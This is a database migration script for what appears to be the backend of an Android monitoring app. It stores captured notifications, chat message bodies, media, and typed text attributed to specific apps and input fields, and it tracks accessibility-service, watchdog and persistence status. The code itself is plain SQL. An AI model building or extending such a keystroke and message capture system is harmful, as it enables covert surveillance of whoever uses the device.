import { db } from './client.js'

export async function migrate() {
    await db.query(`CREATE INDEX IF NOT EXISTS idx_notif_throttle ON notifications (device_id, package_name, received_at DESC)`)
    await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS image_url TEXT`)
    await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS sender_name TEXT NOT NULL DEFAULT ''`)
    await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS chat_body TEXT`)
    await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS image_source TEXT`)
    await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS photo_intent BOOLEAN NOT NULL DEFAULT false`)
    await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS related_notification_hash TEXT`)
    for (const column of [
        'notification_key TEXT',
        'channel_id TEXT',
        'category TEXT',
        'group_key TEXT',
        'sort_key TEXT',
        'conversation_title TEXT',
        'flags INTEGER NOT NULL DEFAULT 0',
        'extras_json TEXT',
    ]) {
        await db.query(`ALTER TABLE notifications ADD COLUMN IF NOT EXISTS ${column}`)
    }
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS target_name TEXT NOT NULL DEFAULT ''`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS raw_package TEXT NOT NULL DEFAULT ''`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS raw_app_label TEXT NOT NULL DEFAULT ''`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS resolved_package TEXT`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS resolved_app_label TEXT`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS attribution_source TEXT`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS attribution_confidence REAL NOT NULL DEFAULT 0`)
    await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS target_source TEXT`)
    for (const column of [
        'class_name TEXT',
        'view_id TEXT',
        'hint_text TEXT',
        'content_description TEXT',
        'input_type INTEGER',
        'event_type INTEGER',
    ]) {
        await db.query(`ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS ${column}`)
    }
    await db.query(`CREATE INDEX IF NOT EXISTS idx_typed_timeline ON typed_text (device_id, package_name, captured_at DESC)`)
    await db.query(`CREATE INDEX IF NOT EXISTS idx_notif_posted ON notifications (device_id, posted_at DESC)`)
    await db.query(`CREATE INDEX IF NOT EXISTS idx_media_timeline ON media_captures (device_id, captured_at DESC)`)
    await db.query(`ALTER TABLE media_captures ADD COLUMN IF NOT EXISTS related_notification_hash TEXT`)
    await db.query(`ALTER TABLE media_captures ADD COLUMN IF NOT EXISTS action TEXT`)
    await db.query(`CREATE INDEX IF NOT EXISTS idx_media_related_notification ON media_captures (related_notification_hash)`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS listener_connected BOOLEAN NOT NULL DEFAULT false`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS foreground_service_running BOOLEAN NOT NULL DEFAULT false`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS watchdog_enabled BOOLEAN NOT NULL DEFAULT false`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS boot_time TIMESTAMPTZ`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS install_time TIMESTAMPTZ`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS update_time TIMESTAMPTZ`)
    await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS last_listener_event_at TIMESTAMPTZ`)
    for (const column of [
        'typed_text_alive_at TIMESTAMPTZ',
        'typed_text_last_event_at TIMESTAMPTZ',
        'typed_text_connected BOOLEAN',
        'typed_service_bind_total BIGINT NOT NULL DEFAULT 0',
        'typed_events_total BIGINT NOT NULL DEFAULT 0',
        'typed_text_sent_total BIGINT NOT NULL DEFAULT 0',
        'typed_placeholder_rejected_total BIGINT NOT NULL DEFAULT 0',
        'typed_service_reconnect_total BIGINT NOT NULL DEFAULT 0',
        'watchdog_last_fired_at TIMESTAMPTZ',
        'notification_rebind_total BIGINT NOT NULL DEFAULT 0',
        'listener_last_connected_at TIMESTAMPTZ',
        'listener_last_disconnected_at TIMESTAMPTZ',
        'notification_images_total BIGINT NOT NULL DEFAULT 0',
        'notification_images_failed_total BIGINT NOT NULL DEFAULT 0',
    ]) {
        await db.query(`ALTER TABLE app_status ADD COLUMN IF NOT EXISTS ${column}`)
    }
    await db.query(`
        CREATE TABLE IF NOT EXISTS app_status_history (
            id                       BIGSERIAL    PRIMARY KEY,
            device_id                VARCHAR(64)  NOT NULL,
            app_role                 VARCHAR(32)  NOT NULL,
            package_name             VARCHAR(255) NOT NULL DEFAULT '',
            app_label                TEXT         NOT NULL DEFAULT '',
            version_name             VARCHAR(64)  NOT NULL DEFAULT '',
            listener_enabled         BOOLEAN      NOT NULL DEFAULT false,
            accessibility_enabled    BOOLEAN      NOT NULL DEFAULT false,
            battery_exempt           BOOLEAN      NOT NULL DEFAULT false,
            media_enabled            BOOLEAN      NOT NULL DEFAULT false,
            all_files_access         BOOLEAN      NOT NULL DEFAULT false,
            listener_connected       BOOLEAN      NOT NULL DEFAULT false,
            foreground_service_running BOOLEAN    NOT NULL DEFAULT false,
            watchdog_enabled         BOOLEAN      NOT NULL DEFAULT false,
            boot_time                TIMESTAMPTZ,
            install_time             TIMESTAMPTZ,
            update_time              TIMESTAMPTZ,
            last_listener_event_at   TIMESTAMPTZ,
            created_at               TIMESTAMPTZ  NOT NULL DEFAULT NOW()
        )
    `)
    await db.query(`CREATE INDEX IF NOT EXISTS idx_app_status_history_device ON app_status_history (device_id, created_at DESC)`)
    await db.query(`
        CREATE TABLE IF NOT EXISTS favorites (
            id          BIGSERIAL    PRIMARY KEY,
            device_id   VARCHAR(64)  NOT NULL,
            item_key    VARCHAR(8)   NOT NULL,
            item_id     BIGINT       NOT NULL,
            created_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
            CONSTRAINT uq_favorite_item UNIQUE (device_id, item_key, item_id)
        )
    `)
    await db.query(`CREATE INDEX IF NOT EXISTS idx_favorites_device ON favorites (device_id, created_at DESC)`)
}
